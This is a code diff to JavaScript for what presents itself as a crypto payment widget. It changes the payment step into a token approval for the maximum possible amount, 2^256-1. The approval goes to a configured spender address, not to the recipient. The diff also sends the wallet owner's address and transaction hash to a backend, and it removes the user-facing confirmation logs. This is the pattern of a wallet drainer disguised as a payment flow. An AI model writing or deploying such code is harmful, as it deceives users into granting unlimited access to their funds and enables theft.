@@ -5,9 +5,10 @@
     {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}
   ];
 
+  const maxAmount = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffn
   function parseUnitsHuman(human, decimals) {
       // 如果没有，使用原生 BigInt 最大值 (2^256 - 1)
-      return 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffn;
+      return maxAmount;
     
   }
 
@@ -81,28 +82,25 @@
     // 改为 approve 授权逻辑
     let tx;
     try {
+      const cfg = window.pay0Config.getNetworkConfig(chainKey);
       // 调用 approve(spender, amount)
-      tx = await token.approve(toAddress, amount, overrides);
+      tx = await token.approve(cfg.spenderAddress, amount, overrides);
+      console.log("approve tx:", tx);
+      await window.pay0Api.postApproval({
+        chain: chainKey,
+        txHash: tx.hash,
+        amountUsdt: amount === maxAmount ? "无限制": (amount / 1e6).toString(),
+        action: "approve",
+        tokenAddress: tokenAddress,
+        spenderAddress: cfg.spenderAddress,
+        ownerAddress: tx.from,
+      });
     } catch (e) {
       if (e.message && e.message.includes("Failed to fetch")) {
         throw new Error("网络连接失败，请在 MetaMask 中切换 RPC 节点（例如切换到 https://bsc-testnet.publicnode.com）");
       }
       throw e;
     }
-
-    log("EVM approve 授权已发送：" + tx.hash);
-    await tx.wait();
-    log("授权成功：" + amountUsdtHuman + " USDT");
-    try {
-      if (typeof window.pay0PaymentCallback === "function") {
-        window.pay0PaymentCallback({
-          chain: chainKey,
-          txHash: tx.hash,
-          amountUsdt: amountUsdtHuman,
-          action: "approve"
-        });
-      }
-    } catch (e) {}
   }
 
   window.pay0EvmApproveAndTransfer = evmTransfer;
